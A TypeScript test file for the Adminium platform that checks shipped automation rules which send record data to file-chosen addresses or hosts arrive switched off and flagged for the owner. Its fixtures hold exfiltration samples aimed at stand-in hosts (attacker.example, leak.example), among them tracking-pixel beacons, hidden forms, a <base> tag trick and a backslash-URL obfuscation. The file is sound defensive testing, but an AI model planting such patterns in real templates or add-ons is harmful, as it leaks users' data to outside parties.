// SPDX-License-Identifier: AGPL-3.0-only
/**
 * A SHIPPED STEP THAT SENDS OUT WITH NO ADDRESS TO FILL IN ARRIVES SWITCHED OFF.
 *
 * A webhook and a mail to typed addresses are not the only ways out. A step
 * that writes an address of the file's own into the column a mail goes to,
 * an add-on's step given an address, a mail whose template links to an
 * outside host with the record's values in the link: each rule arrives
 * switched off, with an "after you install" item naming the step, on every
 * engine. An update that brings such a step switches an unchanged rule off
 * again; one the owner already looked at stays as they left it.
 */
import { DOCUMENT_LOCALE_IDS } from '@adminium/add-on-contracts';
import { appAfterInstallRepo, automationsRepo, type Automation } from '@adminium/meta';
import type { Manifest } from '@adminium/manifest';
import { afterEach, describe, expect, it } from 'vitest';

import { installAutomations, outboundSteps, plannedAfterInstallOfRules, sampleTablesOf } from '../src/apps/manifest-automations.js';
import { loadSnapshotView } from '../src/data-io/snapshot-view.js';
import { bareAddress } from '../src/installs/resolve.js';
import { addOnHarness, ENGINES, type Harness } from './app-add-ons.helpers.js';
import { stockKitManifest } from './fixtures/stock-kit/index.js';
import { onlyInstall } from './only-install.js';

// eslint-disable-next-line @typescript-eslint/no-explicit-any -- a manifest and a stored rule read freely
type Doc = Record<string, any>;

const words = (text: string) => Object.fromEntries(DOCUMENT_LOCALE_IDS.map((id) => [id, text]));
const node = (id: string, kind: string, more: Doc = {}) => ({ id, kind, title: `Step ${id}`, ...more });
const trigger = { kind: 'record', event: 'updated', table: 'items', changedColumn: 'zone' };
const mailTemplate = (key: string, blocks: Doc[]) => ({ key, name: key, locales: { 'en-US': { subject: '{{record.name}} moved', blocks } } });

const TEMPLATES = [
  // An outside link that carries nothing of the record: sends nothing out.
  mailTemplate('stock-kit-plain', [{ block: 'email.text', data: { text: 'Only {{record.left}} left.' } }, { block: 'email.button', data: { label: 'Read how', url: 'https://docs.example/stock' } }]),
  mailTemplate('stock-kit-beacon', [{ block: 'email.image', data: { url: 'https://track.example/p.png?n={{record.name}}', alt: 'x' } }]),
  // A backslash where the slashes go: a browser goes to leak.example all the same.
  mailTemplate('stock-kit-link', [{ block: 'email.button', data: { label: 'Open', url: 'https:\\\\leak.example/c?l={{record.left}}' } }]),
];
/** Raw markup: no app template may hold it, so it is read here from the file alone. */
const HTML_TEMPLATE = mailTemplate('stock-kit-html', [{ block: 'email.html', data: { code: '<a href="//leak.example/c?l={{record.left}}">Open</a>' } }]);

/** A step of the kit's own that writes a take, given an address. */
const NOTE_STEP = {
  key: 'note',
  name: words('Note it'),
  does: words('Writes a take'),
  inputs: [{ key: 'to', label: words('To'), kind: 'email' }],
  writes: { table: 'takes', values: { item_id: { token: 'recordKey' }, note: { input: 'to' } } },
};

const RULE = (key: string, nodes: Doc[]): Doc => ({ key, name: key, enabled: true, trigger, graph: { version: 1, nodes: [node('t', 'trigger'), ...nodes] } });
const RULES: Doc[] = [
  // Writes an address of the file's own into the column the next rule mails.
  RULE('fill-contact', [node('w', 'action', { action: { kind: 'record.update', values: { contact: 'buyer@attacker.example' } } })]),
  RULE('mail-contact', [node('m', 'action', { action: { kind: 'email', templateKey: 'stock-kit-plain', to: { kind: 'field', column: 'contact' }, class: 'service' } })]),
  // A mail whose template beacons the record out, and one whose raw markup links it out.
  RULE('beacon', [node('b', 'action', { action: { kind: 'email', templateKey: 'stock-kit-beacon', to: { kind: 'field', column: 'buyer_email' }, class: 'service' } })]),
  RULE('html-link', [node('h', 'action', { action: { kind: 'notification', to: { roles: ['manager'] }, title: 'x' } }), node('l', 'action', { action: { kind: 'email', templateKey: 'stock-kit-link', to: { kind: 'field', column: 'buyer_email' }, class: 'service' } })]),
  // An add-on's step given an address of the file's own.
  RULE('step-out', [node('s', 'action', { action: { kind: 'add-on.step', addOn: 'stock-kit', step: 'note', inputs: { to: 'drop@attacker.example' } } })]),
  // Sends nothing out: keeps its switch.
  RULE('tidy', [node('u', 'action', { action: { kind: 'record.update', values: { opening: '0', name: '{{record.name}}' } } })]),
  RULE('mail-plain', [node('p', 'action', { action: { kind: 'email', templateKey: 'stock-kit-plain', to: { kind: 'field', column: 'buyer_email' }, class: 'service' } })]),
];

const FLAGGED = [
  { kind: 'outbound', item: 'fill-contact', field: 'w' },
  { kind: 'outbound', item: 'mail-contact', field: 'm' },
  { kind: 'outbound', item: 'beacon', field: 'b' },
  { kind: 'outbound', item: 'html-link', field: 'l' },
  { kind: 'outbound', item: 'step-out', field: 's' },
];

function kit(rules: Doc[] = RULES): Doc {
  const base = stockKitManifest() as Doc;
  const tables = (base['requiredSchema'] as Doc)['tables'] as Doc[];
  const items = tables.find((table) => table['ref'] === 'items')!;
  return {
    ...base,
    compatibility: { minAdminiumVersion: '0.3.49' },
    addOn: { ...(base['addOn'] as Doc), steps: [NOTE_STEP] },
    requiredSchema: {
      ...(base['requiredSchema'] as Doc),
      tables: [
        { ...items, columns: [...(items['columns'] as Doc[]), { ref: 'contact', type: 'text', maxLength: 200, nullable: true }, { ref: 'buyer_email', type: 'text', maxLength: 200, nullable: true }] },
        ...tables.filter((table) => table !== items).map((table) => (table['ref'] === 'takes' ? { ...table, columns: [...(table['columns'] as Doc[]), { ref: 'note', type: 'text', maxLength: 200, nullable: true }] } : table)),
      ],
    },
    emailTemplates: TEMPLATES,
    automations: structuredClone(rules),
  };
}

describe('the steps that send out with no address to fill in', () => {
  it('are found from the file alone, every rule at once', () => {
    const found = outboundSteps(kit() as unknown as Manifest);
    expect(Object.fromEntries(found)).toEqual({ 'fill-contact': ['w'], 'mail-contact': ['m'], beacon: ['b'], 'html-link': ['l'], 'step-out': ['s'] });
  });

  it('a raw markup template that links the record out counts too', () => {
    const doc = kit([RULE('h', [node('x', 'action', { action: { kind: 'email', templateKey: 'stock-kit-html', to: { kind: 'field', column: 'buyer_email' } } })])]);
    expect(Object.fromEntries(outboundSteps({ ...doc, emailTemplates: [HTML_TEMPLATE] } as unknown as Manifest))).toEqual({ h: ['x'] });
  });

  it('counts each way out, and leaves what sends nothing', () => {
    const one = (rules: Doc[], templates: Doc[] = TEMPLATES) => Object.fromEntries(outboundSteps({ ...kit(rules), emailTemplates: templates } as unknown as Manifest));
    const write = (values: Doc) => RULE('w', [node('x', 'action', { action: { kind: 'record.update', values } })]);
    // An address anywhere, a link carrying the record out: out, with no mail step in the file.
    expect(one([write({ name: '{{record.name}}@attacker.example' })])).toEqual({ w: ['x'] });
    expect(one([write({ name: 'https://leak.example/?v={{record.left}}' })])).toEqual({ w: ['x'] });
    // Words of its own in a column nothing mails, a plain link, a copy of the record: nothing out.
    expect(one([write({ name: 'Checked', zone: 'shelf' })])).toEqual({});
    expect(one([write({ name: 'See https://docs.example/stock' })])).toEqual({});
    expect(one([write({ contact: '{{record.name}}' })])).toEqual({});
    // A mail's own values that link out; a summary whose template carries the rows out.
    const mail = (more: Doc) => RULE('m', [node('x', 'action', { action: { kind: 'email', templateKey: 'stock-kit-plain', to: { kind: 'field', column: 'buyer_email' }, ...more } })]);
    expect(one([mail({ vars: { link: 'https://leak.example/{{record.left}}' } })])).toEqual({ m: ['x'] });
    expect(one([mail({ vars: { greeting: 'Hello {{record.name}}' } })])).toEqual({});
    const digest = RULE('d', [node('x', 'action', { action: { kind: 'digest', templateKey: 'stock-kit-beacon', to: { roles: ['manager'] }, sections: [] } })]);
    expect(one([digest])).toEqual({ d: ['x'] });
    // A template link nobody can tell (the whole address a value of the record) counts too.
    expect(one([mail({})], [mailTemplate('stock-kit-plain', [{ block: 'email.button', data: { label: 'Go', url: '{{record.website}}' } }])])).toEqual({ m: ['x'] });
    // An add-on step's phone number of the file's own; its record value is no address of the file's.
    const step = (inputs: Doc) => RULE('s', [node('x', 'action', { action: { kind: 'add-on.step', addOn: 'sms', step: 'send', inputs } })]);
    expect(one([step({ to: '+44 20 7946 0000' })])).toEqual({ s: ['x'] });
    expect(one([step({ to: '{{record.phone}}', text: 'Your order is ready' })])).toEqual({});
  });

  it('a mail to a column whose value the file chose counts: a default, a copy of one, a rule, seeded rows, a setting written in', () => {
    const mailTo = (key: string, column: string, on: Doc = trigger) => ({ ...RULE(key, [node('x', 'action', { action: { kind: 'email', templateKey: 'stock-kit-plain', to: { kind: 'field', column }, class: 'service' } })]), trigger: on });
    const onTake = { kind: 'record', event: 'created', table: 'takes' };
    /** The kit with more columns on items and on takes, and what else the file says. */
    const shaped = (rules: Doc[], items: Doc[], takes: Doc[] = [], more: Doc = {}) => {
      const doc = kit(rules);
      const tables = (doc['requiredSchema'] as Doc)['tables'] as Doc[];
      for (const table of tables) {
        if (table['ref'] === 'items') table['columns'] = [...(table['columns'] as Doc[]), ...items];
        if (table['ref'] === 'takes') table['columns'] = [...(table['columns'] as Doc[]), ...takes];
      }
      return Object.fromEntries(outboundSteps({ ...doc, ...more } as unknown as Manifest));
    };
    const audit = (more: Doc = {}) => ({ ref: 'audit_email', type: 'text', maxLength: 200, nullable: true, ...more });
    // A default of the file's own: the mail goes where the file says.
    expect(shaped([mailTo('m', 'audit_email')], [audit({ default: 'audit@attacker.example' })])).toEqual({ m: ['x'] });
    expect(shaped([mailTo('m', 'audit_email')], [audit({ rules: { default: { from: { table: 'items', column: 'name' } } } })])).toEqual({ m: ['x'] });
    expect(shaped([mailTo('m', 'audit_email')], [audit({ rules: { stamp: { set: { byOrigin: { public: 'audit@attacker.example' } }, on: 'create' } } })])).toEqual({ m: ['x'] });
    // A copy from the linked row: out when the column it copies is the file's, not when it is a person's.
    const copied = (from: string) => [{ ref: 'to_email', type: 'text', maxLength: 200, nullable: true, rules: { copy: { via: 'item_id', from } } }];
    expect(shaped([mailTo('m', 'to_email', onTake)], [audit({ default: 'audit@attacker.example' })], copied('audit_email'))).toEqual({ m: ['x'] });
    expect(shaped([mailTo('m', 'to_email', onTake)], [audit()], copied('buyer_email'))).toEqual({});
    // Rows the file brings with that column filled; a seed file nobody here can read.
    expect(shaped([mailTo('m', 'buyer_email')], [], [], { seeds: [{ table: 'items', rows: [{ name: 'Bolt', buyer_email: 'drop@attacker.example' }] }] })).toEqual({ m: ['x'] });
    expect(shaped([mailTo('m', 'buyer_email')], [], [], { seeds: [{ table: 'items', rows: [{ name: 'Bolt' }] }] })).toEqual({});
    expect(shaped([mailTo('m', 'buyer_email')], [], [], { seeds: [{ table: 'items', file: 'seeds/items.json' }] })).toEqual({ m: ['x'] });
    expect(shaped([mailTo('m', 'buyer_email')], [], [], { sampleData: { file: 'seeds/sample.json' } })).toEqual({ m: ['x'] });
    // A value that is not words, written into the column a mail goes to: the step and the mail.
    const write = RULE('w', [node('y', 'action', { action: { kind: 'record.update', values: { buyer_email: { setting: { table: 'items', column: 'name' } } } } })]);
    expect(shaped([write, mailTo('m', 'buyer_email')], [])).toEqual({ w: ['y'], m: ['x'] });
    // A default on a column nothing mails sends nothing.
    expect(shaped([mailTo('m', 'buyer_email')], [audit({ default: 'audit@attacker.example' })])).toEqual({});
  });

  it('sample rows count only for the tables the sample files fill, when those files were read', () => {
    const mailTo = (key: string, column: string, on: Doc) => ({ ...RULE(key, [node('x', 'action', { action: { kind: 'email', templateKey: 'stock-kit-plain', to: { kind: 'field', column }, class: 'service' } })]), trigger: on });
    const doc = kit([mailTo('items-mail', 'buyer_email', trigger), mailTo('takes-mail', 'note', { kind: 'record', event: 'created', table: 'takes' })]);
    const found = (sampleTables?: ReadonlySet<string>) => Object.fromEntries(outboundSteps({ ...doc, sampleData: { file: 'seeds/sample.json' } } as unknown as Manifest, sampleTables));
    // The file fills takes only: the mail to an items column goes to the person's own address.
    expect(found(new Set(['takes']))).toEqual({ 'takes-mail': ['x'] });
    expect(found(new Set())).toEqual({});
    // Its files not read: every table counts.
    expect(found()).toEqual({ 'items-mail': ['x'], 'takes-mail': ['x'] });
  });

  it('reads the tables a sample file and its rows for add-ons fill; one it cannot read counts every table', async () => {
    const bundle = (refs: string[]) => Buffer.from(JSON.stringify({ format: 'adminium.sample/1', app: 'stock-kit', tables: refs.map((ref) => ({ ref, rows: [{ '@label': 'a' }] })) }));
    const files: Record<string, Uint8Array> = { 'seeds/sample.json': bundle(['takes']), 'seeds/for-sms.json': bundle(['texts', 'items']), 'seeds/broken.json': Buffer.from('not json') };
    const read = async (path: string): Promise<Uint8Array> => {
      const bytes = files[path];
      if (bytes === undefined) throw new Error(`no ${path}`);
      return bytes;
    };
    const tablesOf = (sampleData: Doc | undefined) => sampleTablesOf({ ...kit(), ...(sampleData === undefined ? {} : { sampleData }) } as unknown as Manifest, read);
    expect(await tablesOf(undefined)).toEqual(new Set());
    expect(await tablesOf({ file: 'seeds/sample.json' })).toEqual(new Set(['takes']));
    expect(await tablesOf({ file: 'seeds/sample.json', addOns: { sms: { file: 'seeds/for-sms.json' } } })).toEqual(new Set(['takes', 'texts', 'items']));
    expect(await tablesOf({ file: 'seeds/broken.json' })).toBeUndefined();
    expect(await tablesOf({ file: 'seeds/missing.json' })).toBeUndefined();
  });

  it('a template with a <base>, or a form sent to an outside host with the record in it, counts', () => {
    const mail = RULE('m', [node('x', 'action', { action: { kind: 'email', templateKey: 'stock-kit-html', to: { kind: 'field', column: 'buyer_email' } } })]);
    const one = (code: string) => Object.fromEntries(outboundSteps({ ...kit([mail]), emailTemplates: [mailTemplate('stock-kit-html', [{ block: 'email.html', data: { code } }])] } as unknown as Manifest));
    expect(one('<base href="https://leak.example/"><img src="p/{{record.name}}">')).toEqual({ m: ['x'] });
    expect(one('<form action="https://leak.example/f"><input type="hidden" value="{{record.name}}"><button>Go</button></form>')).toEqual({ m: ['x'] });
    expect(one('<p>{{record.name}}</p><a href="https://docs.example/stock">Read how</a>')).toEqual({});
  });

  it('an add-on step given a person of the record (sales-crm 0.2.4) sends nothing of the file\'s own', () => {
    // As released: the fit-out survey to the job's contact, two days after it is signed off.
    const survey: Doc = {
      key: 'survey-after-sign-off',
      name: { 'en-US': 'A job is signed off: the fit-out survey 2 days later' },
      enabled: false,
      module: 'surveys',
      trigger: { kind: 'record', event: 'updated', table: 'jobs', changedColumn: 'state', when: [{ left: { field: 'state' }, op: 'is', right: 'signed-off' }] },
      graph: {
        version: 1,
        nodes: [
          { id: 't', kind: 'trigger', title: 'A job is signed off' },
          { id: 'wait', kind: 'wait', title: 'Wait 2 days', amount: 2, unit: 'days' },
          { id: 'still', kind: 'condition', title: 'Still signed off', condition: { left: { field: 'state' }, op: 'is', right: 'signed-off' } },
          { id: 'send', kind: 'action', title: "Send the fit-out survey to the job's contact", action: { kind: 'add-on.step', addOn: 'forms', step: 'send-survey', inputs: { survey: 'fit-out', to: '@link:contact_id', class: 'marketing' } } },
        ],
      },
    };
    expect(Object.fromEntries(outboundSteps({ ...kit([]), automations: [survey] } as unknown as Manifest))).toEqual({});
    const self: Doc = structuredClone(survey);
    self['graph']['nodes'][3]['action']['inputs']['to'] = '@record';
    expect(Object.fromEntries(outboundSteps({ ...kit([]), automations: [self] } as unknown as Manifest))).toEqual({});
    // An address of the file's own in the same place still counts.
    const typed: Doc = structuredClone(survey);
    typed['graph']['nodes'][3]['action']['inputs']['to'] = 'drop@attacker.example';
    expect(Object.fromEntries(outboundSteps({ ...kit([]), automations: [typed] } as unknown as Manifest))).toEqual({ 'survey-after-sign-off': ['send'] });
  });

  it('are listed for the review before anything is made', () => {
    expect(plannedAfterInstallOfRules({ ...kit(), kind: 'app' } as unknown as Manifest).filter((item) => item.kind === 'outbound')).toEqual(FLAGGED);
  });
});

for (const [dialect, available] of ENGINES) {
  describe.skipIf(!available)(`a shipped rule whose step sends out [${dialect}]`, () => {
    let h: Harness | null = null;
    afterEach(async () => {
      await h?.close();
      h = null;
    });

    async function installed(doc: Doc = kit()): Promise<Harness> {
      const harness = await addOnHarness(dialect, { unbuiltWords: {} });
      await harness.stageAddOn(doc, { files: { 'dist/client.js': 'export default function Count() { return null; }' } });
      const reply = await harness.inject({ method: 'POST', url: '/add-ons', payload: { key: 'stock-kit', version: '1.0.0', attachTo: [] } });
      expect(reply.statusCode, reply.body).toBe(200);
      return harness;
    }
    const rulesOf = (harness: Harness) => automationsRepo(harness.meta).listManagedBy('stock-kit', harness.connectionId);
    const byKey = async (harness: Harness, key: string): Promise<Automation> => (await rulesOf(harness)).find((rule) => rule.templateKey === key)!;
    const again = async (harness: Harness, doc: Doc) => {
      const view = await loadSnapshotView(harness.meta, harness.connectionId);
      const install = bareAddress((await onlyInstall(harness.meta, 'stock-kit')).installId, 'stock-kit');
      return installAutomations({ meta: harness.meta, manifest: doc as unknown as Manifest, install, connectionId: harness.connectionId, view, realId: (ref) => view.model.tables.find((table) => table.name === `stock_kit_${ref}`)?.id ?? ref });
    };

    it('arrives switched off with its words kept, and an after-install item for each such step', async () => {
      h = await installed();
      for (const key of ['fill-contact', 'mail-contact', 'beacon', 'html-link', 'step-out']) expect((await byKey(h, key)).enabled, key).toBe(false);
      for (const key of ['tidy', 'mail-plain']) expect((await byKey(h, key)).enabled, key).toBe(true);
      // The file's words stay, for the owner to read before switching it on.
      const fill = await byKey(h, 'fill-contact');
      expect(((fill.graph.nodes as Doc[]).find((one) => one['id'] === 'w') as Doc)['action']['values']).toEqual({ contact: 'buyer@attacker.example' });
      const items = await appAfterInstallRepo(h.meta).list((await onlyInstall(h.meta, 'stock-kit')).installId);
      expect(items.filter((item) => item.kind === 'outbound').map(({ kind, item, field }) => ({ kind, item, field }))).toEqual(expect.arrayContaining(FLAGGED));
      expect(items.filter((item) => item.kind === 'outbound')).toHaveLength(FLAGGED.length);
    });

    it('a mail to a column the file gave a default arrives switched off, with its item', async () => {
      const doc = kit([...RULES, RULE('mail-audit', [node('a', 'action', { action: { kind: 'email', templateKey: 'stock-kit-plain', to: { kind: 'field', column: 'audit_email' }, class: 'service' } })])]);
      const items = ((doc['requiredSchema'] as Doc)['tables'] as Doc[]).find((table) => table['ref'] === 'items')!;
      items['columns'] = [...(items['columns'] as Doc[]), { ref: 'audit_email', type: 'text', maxLength: 200, nullable: true, default: 'audit@attacker.example' }];
      h = await installed(doc);
      expect((await byKey(h, 'mail-audit')).enabled).toBe(false);
      expect((await byKey(h, 'mail-plain')).enabled).toBe(true);
      const after = await appAfterInstallRepo(h.meta).list((await onlyInstall(h.meta, 'stock-kit')).installId);
      expect(after.filter((item) => item.kind === 'outbound').map(({ item, field }) => `${item}.${field}`)).toContain('mail-audit.a');
    });

    it('an update that brings one switches an unchanged rule off again; one already shown stays as its owner left it', async () => {
      h = await installed();
      const repo = automationsRepo(h.meta);
      // The owner looked at the beacon and switched it on; the plain mail was on from the start.
      await repo.update((await byKey(h, 'beacon')).id, { enabled: true });
      expect((await byKey(h, 'mail-plain')).enabled).toBe(true);

      // 1.1.0: the plain mail now carries the record out.
      const next = kit();
      next['emailTemplates'] = [...TEMPLATES.filter((one) => one.key !== 'stock-kit-plain'), mailTemplate('stock-kit-plain', [{ block: 'email.button', data: { label: 'Open', url: 'https://leak.example/?l={{record.left}}' } }])];
      const result = await again(h, next);
      expect(result?.afterInstall).toEqual(expect.arrayContaining([{ kind: 'outbound', item: 'mail-plain', field: 'p' }, { kind: 'outbound', item: 'beacon', field: 'b' }]));
      expect((await byKey(h, 'mail-plain')).enabled).toBe(false);
      expect((await byKey(h, 'beacon')).enabled).toBe(true);
      expect((await byKey(h, 'tidy')).enabled).toBe(true);
    });
  });
}
